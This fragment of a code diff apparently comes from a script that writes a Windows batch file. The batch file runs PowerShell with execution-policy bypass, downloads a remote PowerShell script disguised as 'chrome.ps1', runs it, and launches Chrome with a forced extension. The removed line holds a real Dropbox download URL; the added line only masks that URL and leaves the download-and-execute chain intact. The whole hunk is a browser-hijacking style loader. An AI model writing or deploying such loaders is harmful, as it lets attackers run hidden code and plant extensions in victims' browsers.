@@ -84,7 +84,7 @@ PAUSE
 							# Write the new file
 							batch = """
 @echo off
-	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile('https://www.dropbox.com/s/0h7t1f22wbgtysw/iljojpiodmlhoehoecppliohmplbgeij.ps1?dl=1','chrome.ps1')"  
+	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile('******','chrome.ps1')"  
 	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "./chrome.ps1"
 	PowerShell.exe Start-Process "chrome.exe --load-extension=C:\chrome\output\extensions\\extensionid"
 echo
